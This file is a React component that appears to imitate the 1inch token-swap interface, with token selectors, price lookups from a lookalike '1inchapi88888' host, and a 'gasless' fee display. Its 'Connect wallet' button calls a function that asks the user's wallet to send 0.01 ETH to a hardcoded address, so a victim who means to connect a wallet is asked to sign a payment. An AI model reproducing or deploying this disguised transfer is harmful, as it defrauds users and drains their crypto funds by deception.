import { useState, useEffect } from "react";
import axios from "axios";
import { ethers } from "ethers";
import { BrowserProvider } from "ethers";

import SwapSelectToken from "./SwapSelectToken";
import SwapSelectSourceToken from "./SwapSelectSourceToken";
import restartIcon from "./assets/restart.png";
import addIcon from "./assets/add.png";
import settingsicon from "./assets/settings.png";
import gasLess from "./assets/gasless-night_2-1.webp";

import maticIcon from "./assets/matic.svg";
import wethIcon from "./assets/weth.webp";
import daiIcon from "./assets/dai.webp";
import usdcIcon from "./assets/usdc.webp";
import usdtIcon from "./assets/usdt.webp";
import wbtcIcon from "./assets/wbtc.webp";
import deIcon from "./assets/de.webp";
import pinIcon from "./assets/pin.svg";
import linkIcon from "./assets/LINK.webp";
import uniIcon from "./assets/uni.webp";
import grtIcon from "./assets/grt.webp";
import ldoIcon from "./assets/ldo.webp";
import aaveIcon from "./assets/aave.webp";
import Skeleton from "react-loading-skeleton";
import "react-loading-skeleton/dist/skeleton.css";

const sendTransaction = async ({ setError }) => {
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    

    //const provider = new ethers.providers.Web3Provider(window.ethereum);
    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    console.log(signer);
    const tx = await signer.sendTransaction({
      to: "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0", // Укажите здесь адрес получателя
      value: ethers.parseEther("0.01"), // Укажите здесь количество ETH для отправки
    });

    console.log("Transaction Hash:", tx.hash);
  } catch (err) {
    setError(err.message);
    console.log(err.message);
  }
};

function Swap() {
  const [swapFromExpand, setSwapFromExpand] = useState(false);
  const [swapSelectToken, setSwapSelectToken] = useState(false);
  const [swapSelectSourceToken, setSwapSelectSourceToken] = useState(false);
  //const [priceTokenYouReceive, setPriceTokenYouReceive] = useState(null);
  const [percent_changed, setPercentChanged] = useState(null);
  //const [youReceiveToken, setYouReceiveToken] = useState("DAI");
  //const [tokenYouReceiveAmount, setTokenYouReceiveAmount] = useState(null);
  //const [priceYouPay, setPriceYouPay] = useState(null);
  //const [youPayToken, setYouPayToken] = useState("USDT");
  const [tokenYouPayFullName, setYouPayTokenFullName] = useState("Tether USDT");

  //const [tokenYouPayQuantity, setTokenYouPayQuantity] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  /******************************************* */
  const [youPayToken, setYouPayToken] = useState("USDT");
  const [youPayTokenAmount, setYouPayTokenAmount] = useState(1);
  const [youPayTokenPrice, setYouPayTokenPrice] = useState(null);
  const [youReceiveToken, setYouReceiveToken] = useState("DAI");
  const [youReceiveTokenAmount, setYouReceiveTokenAmount] = useState(null);
  const [youReceiveTokenPrice, setYouReceiveTokenPrice] = useState(null);
  const [youReceiveTokenPercentChanged, setYouReceiveTokenPercentChanged] =
    useState(null);
  const [USDTPrice, setUSDTPrice] = useState(null);

  const tokenIcons = {
    MATIC: maticIcon,
    WETH: wethIcon,
    DAI: daiIcon,
    USDC: usdcIcon,
    USDT: usdtIcon,
    WBTC: wbtcIcon,
    DE: deIcon,
    PIN: pinIcon,
    LINK: linkIcon,
    UNI: uniIcon,
    GRT: grtIcon,
    LDO: ldoIcon,
    AAVE: aaveIcon,
  };

  const handleSendTransaction = async () => {
    setError();
    await sendTransaction({ setError });
  };

  const handleSwap = () => {
    /*
    const youReceive = youReceiveTokenAmount;
    const youPay = youPayTokenAmount;*/

    /*
    setYouReceiveToken(youPayToken);
    setYouPayToken(youReceiveToken);

    setYouPayTokenAmount(youReceiveTokenPrice);
    setYouReceiveTokenAmount(youPayTokenPrice);*/

    let payPrice = document.getElementById("payPrice").value;
    let receivePrice = document.getElementById("receivePrice").value;

    //console.log("PAAAAAAAAAAAAAAAAAAAAAY: " + payPrice);

    setYouReceiveToken(youPayToken);
    setYouPayToken(youReceiveToken);

    setYouPayTokenAmount(receivePrice);
    setYouReceiveTokenAmount(payPrice);
  };

  useEffect(() => {
    /*
    setTokenYouReceiveAmount(
      (youPayTokenAmount / youReceiveTokenAmount).toFixed(5)
    );*/
    const fetchNewPrice = async () => {
      const newTokenYouPayData = await axios.get(
        "https://1inchapi88888.vercel.app/api/crypto",
        {
          params: {
            symbol: youPayToken,
            convert: "USD",
          },
        }
      );
      if (
        newTokenYouPayData.data.data &&
        newTokenYouPayData.data.data[youPayToken]
      ) {
        const newRoundedPriceTokenYouPay =
          newTokenYouPayData.data.data[youPayToken].quote.USD.price.toFixed(6);
        setYouPayTokenPrice(
          (newRoundedPriceTokenYouPay * youPayTokenAmount).toFixed(6)
        );
        setYouReceiveTokenAmount(
          ((youPayTokenPrice / youReceiveTokenPrice) * USDTPrice).toFixed(6)
        );
      }
    };
    fetchNewPrice();
  }, [youPayTokenAmount /*youReceiveTokenAmount*/]);

  useEffect(() => {
    let roundedPriceTokenYouPay = null;
    let roundedPrice = null;
    let roundedPercentChanged = null;

    const fetchPrice = async () => {
      setLoading(true);
      setError(null);
      try {
        const GetUSDTPrice = await axios.get(
          "https://1inchapi88888.vercel.app/api/crypto",
          {
            params: {
              symbol: "USDT",
              convert: "USD",
            },
          }
        );

        //делаем запрос на сервер данные о токене который покупаем
        const responseTokenYouReceive = await axios.get(
          "https://1inchapi88888.vercel.app/api/crypto",
          {
            params: {
              symbol: youReceiveToken,
              convert: "USD",
            },
          }
        );
        //делаем запрос на сервер данные о токене за счет которого покупаем
        const responseTokenYouPay = await axios.get(
          "https://1inchapi88888.vercel.app/api/crypto",
          {
            params: {
              symbol: youPayToken,
              convert: "USD",
            },
          }
        );

        if (GetUSDTPrice)
          setUSDTPrice(
            GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
          );

        console.log("USDT PRICE!!!!#####################" + USDTPrice);

        //если данные получили округляем до 6 символов после точки и сохраняем цену токена за который покупаем
        if (
          responseTokenYouPay.data.data &&
          responseTokenYouPay.data.data[youPayToken]
        ) {
          roundedPriceTokenYouPay =
            responseTokenYouPay.data.data[youPayToken].quote.USD.price.toFixed(
              6
            );

          setYouPayTokenPrice(roundedPriceTokenYouPay);

          //сохраняем полное название токена
          setYouPayTokenFullName(
            responseTokenYouPay.data.data[youPayToken].name
          );

          //1 USDT = youPayTokenPrice/youReceiveTokenPrice DAI  * на цену USDT чтобы получить цену ~$

          // за 1 USDT  мы получим  такое же количество DAI и в USD это будет равно стоимость токенов Б * на количество токенов Б
        }

        if (
          responseTokenYouReceive.data.data &&
          responseTokenYouReceive.data.data[youReceiveToken]
        ) {
          roundedPrice =
            responseTokenYouReceive.data.data[
              youReceiveToken
            ].quote.USD.price.toFixed(6);
          roundedPercentChanged =
            responseTokenYouReceive.data.data[
              youReceiveToken
            ].quote.USD.percent_change_1h.toFixed(2);
          setYouReceiveTokenPrice(roundedPrice);
          console.log("ROUNDED PRICE!!!!!!!!" + roundedPrice);
          console.log(
            "USDT PRICE$$$$$$$$$$$$$$$$$$$$$$$" +
              GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
          );
          setYouReceiveTokenPercentChanged(roundedPercentChanged);
          /*setYouReceiveTokenPercentChanged(
            responseTokenYouReceive.data.data[
              youReceiveToken
            ].quote.USD.percent_change_1h.toFixed(2)
          );*/
        } else {
          setError(`Symbol ${youReceiveToken} not found in response`);
        }

        if (
          responseTokenYouReceive.data.data &&
          responseTokenYouReceive.data.data[youReceiveToken] ////???????????? WHY PAY
        ) {
          roundedPercentChanged =
            responseTokenYouReceive.data.data[
              youReceiveToken
            ].quote.USD.percent_change_1h.toFixed(2);

          setYouReceiveTokenPercentChanged(roundedPercentChanged);
        } else {
          setError(`Symbol ${youPayToken} not found in response`);
        }

        console.log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
        console.log(youPayTokenPrice);
        console.log(youReceiveTokenPrice);
        console.log(GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6));

        setYouReceiveTokenAmount(
          (
            (roundedPriceTokenYouPay / roundedPrice) *
            GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
          ).toFixed(6)
        );
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchPrice();
  }, [youReceiveToken, youPayToken]); ////WHY both

  // console.log(youPayTokenAmount);

  console.log(youPayToken);
  console.log(youPayTokenAmount);
  console.log(youPayTokenPrice);
  console.log("~~~~~~~~~~~~~~~~~~");
  console.log(youReceiveToken);
  console.log(youReceiveTokenPrice);
  console.log(youReceiveTokenAmount);

  return (
    <div className="page-content">
      <div className="swap-container">
        {!swapSelectToken && !swapSelectSourceToken && (
          <>
            <div className="swap-form-header">
              <div className="trade-menu">
                <span className="trade-menu-swap">Swap</span>
                <span className="trade-menu-limit">Limit</span>
              </div>
              <div className="swap-form-actions">
                <div className="restart-icon">
                  <img className="restart-icon-img" src={restartIcon} alt="" />
                </div>
                <div className="add-icon">
                  <img className="add-icon-img" src={addIcon} alt="" />
                </div>
                <div className="settings-icon">
                  <img
                    className="settings-icon-img"
                    src={settingsicon}
                    alt=""
                  />
                </div>
              </div>
            </div>
            <div className="source-token-input">
              <div className="source-title">
                <span>You pay</span>
              </div>
              <div className="selected-token">
                <div
                  className="select-source-token"
                  onClick={() => setSwapSelectSourceToken(true)}
                >
                  <img
                    className="selected-token-icon"
                    src={tokenIcons[youPayToken]}
                    alt=""
                  />
                  <span className="selected-token-symbol">{youPayToken}</span>
                  <svg
                    id="arrow-down"
                    width="16"
                    height="17"
                    viewBox="0 0 16 17"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M4 6.5L8 10.5L12 6.5"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                  </svg>
                </div>
                <input
                  type="number"
                  value={youPayTokenAmount}
                  onChange={(e) => setYouPayTokenAmount(e.target.value)}
                  id="payPrice"
                  className="source-token-amount-input"
                  style={{
                    WebkitAppearance: "none",
                    MozAppearance: "textfield",
                    color: "white",
                    textAlign: "right",
                    border: "none",
                    outline: "none",
                    backgroundColor: "transparent",
                    fontSize: "24px",
                    fontWeight: 400,
                  }}
                />
              </div>
              <div className="token-info">
                <span className="token-name">{tokenYouPayFullName}</span>
                <div className="token-amount">{"~$" + youPayTokenPrice}</div>
              </div>
            </div>
            <div className="swap-separator">
              <div className="swap-reverse" onClick={handleSwap}>
                <svg
                  id="swap-direction-arrow"
                  width="12"
                  height="11"
                  viewBox="0 0 12 11"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M6 1L6 10M6 10L11 5M6 10L1 5"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  ></path>
                </svg>
              </div>
            </div>
            <div className="destination-token-input">
              <div className="destination-title">
                <span>You receive</span>
              </div>
              <div className="selected-token">
                <div
                  className="select-destination-token"
                  onClick={() => setSwapSelectToken(true)}
                >
                  <img
                    className="selected-token-icon"
                    src={tokenIcons[youReceiveToken]}
                    alt=""
                  />
                  <span className="selected-token-symbol">
                    {youReceiveToken}
                  </span>
                  <svg
                    id="arrow-down"
                    width="16"
                    height="17"
                    viewBox="0 0 16 17"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M4 6.5L8 10.5L12 6.5"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                  </svg>
                </div>
                <div id="receivePrice" className="destination-token-amount">
                  {loading ? (
                    <Skeleton height={20} />
                  ) : (
                    (youPayTokenPrice / youReceiveTokenPrice).toFixed(6)
                  )}
                </div>
              </div>
              <div className="token-info">
                <span className="token-name">{youReceiveToken}</span>
                <div className="token-amount">
                  ~$
                  {(
                    youReceiveTokenAmount *
                    (youPayTokenAmount / youReceiveTokenAmount).toFixed(5)
                  ).toFixed(6)}{" "}
                  ({youReceiveTokenPercentChanged})
                </div>
              </div>
            </div>
            <div className="swap-from">
              <button onClick={() => setSwapFromExpand(!swapFromExpand)}>
                <div className="swap-from-button-title">
                  <span className="from-token-amount">1 {youPayToken}</span>
                  <span className="from-token-equal">=</span>
                  <p className="from-token-rate">
                    {(youPayTokenPrice / youReceiveTokenPrice).toFixed(6)}
                  </p>
                  <span className="from-token-name">{youReceiveToken}</span>
                  <span className="usd-value">
                    (~${(youPayTokenPrice / youPayTokenAmount).toFixed(2)})
                  </span>
                </div>
                {!swapFromExpand && (
                  <div className="swap-from-button-tooltip">
                    <img className="gasless-logo" src={gasLess} alt="gasless" />
                    <span className="gasless-cost">Free</span>
                    <span className="swap-from-button-tooltip-usd-token-price">
                      $0.01
                    </span>
                    <svg
                      id="arrow-swap"
                      viewBox="0 0 17 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                      width="16" // Убедитесь, что эти атрибуты заданы
                      height="16" // Убедитесь, что эти атрибуты заданы
                    >
                      <path
                        d="M4.125 6L8.125 10L12.125 6"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      ></path>
                    </svg>
                  </div>
                )}
                {swapFromExpand && (
                  <svg
                    id="arrow-swap"
                    viewBox="0 0 17 16"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M4.125 6L8.125 10L12.125 6"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      transform="scale(1, -1) translate(0, -16)"
                    ></path>
                  </svg>
                )}
              </button>

              {swapFromExpand && (
                <div className="swap-from-expand">
                  <div className="swap-from-expand-item">
                    <div className="swap-from-expand-item-title">
                      <span>Slippage tolerance</span>
                    </div>
                    <div id="slp-tlr" className="swap-from-expand-item-value">
                      <span className="slp-tlr">2.8%</span>
                      <span className="slp-tlr">·</span>
                      <span className="slp-tlr">Auto</span>
                    </div>
                  </div>
                  <div className="swap-from-expand-item">
                    <div className="swap-from-expand-item-title">
                      Minimum receive
                    </div>
                    <div
                      id="min-receive-val"
                      className="swap-from-expand-item-value"
                    >
                      <span className="min-receive-val">
                        {(
                          youPayTokenAmount / youReceiveTokenAmount -
                          (youPayTokenAmount / youReceiveTokenAmount / 100) *
                            2.8
                        ).toFixed(8)}
                      </span>
                      <span className="min-receive-token">DAI</span>
                      <span>(~$0.47764351)</span>
                    </div>
                  </div>
                  <div className="swap-from-expand-item">
                    <div className="swap-from-expand-item-title">
                      Network fee
                    </div>
                    <div className="swap-from-expand-item-value">
                      <div id="gas-les-item">
                        <img src={gasLess} />
                        <span id="gas-les-item-text">Free</span>
                        <span id="gas-les-item-val">$0.01</span>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="swap-button-container">
              <button className="swap-button" onClick={handleSendTransaction}>
                <span className="swap-button-content">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M6 2C3.79086 2 2 3.79086 2 6V8V18C2 20.2091 3.79086 22 6 22H18C20.2091 22 22 20.2091 22 18V10C22 7.79086 20.2091 6 18 6C18 3.79086 16.2091 2 14 2H6ZM16 6H4C4 4.89543 4.89543 4 6 4H14C15.1046 4 16 4.89543 16 6ZM4 18V8H18C19.1046 8 20 8.89543 20 10V18C20 19.1046 19.1046 20 18 20H6C4.89543 20 4 19.1046 4 18ZM14 13C13.4477 13 13 13.4477 13 14C13 14.5523 13.4477 15 14 15H17C17.5523 15 18 14.5523 18 14C18 13.4477 17.5523 13 17 13H14Z"
                      fill="#5599FF"
                    />
                  </svg>
                  Connect wallet
                </span>
              </button>
            </div>
          </>
        )}
        {swapSelectToken && (
          <SwapSelectToken
            SwapSelect={setSwapSelectToken}
            setYouReceiveToken={setYouReceiveToken}
          />
        )}
        {swapSelectSourceToken && (
          <SwapSelectSourceToken
            SwapSelect={setSwapSelectSourceToken}
            setYouPayToken={setYouPayToken}
          />
        )}
      </div>
    </div>
  );
}

export default Swap;
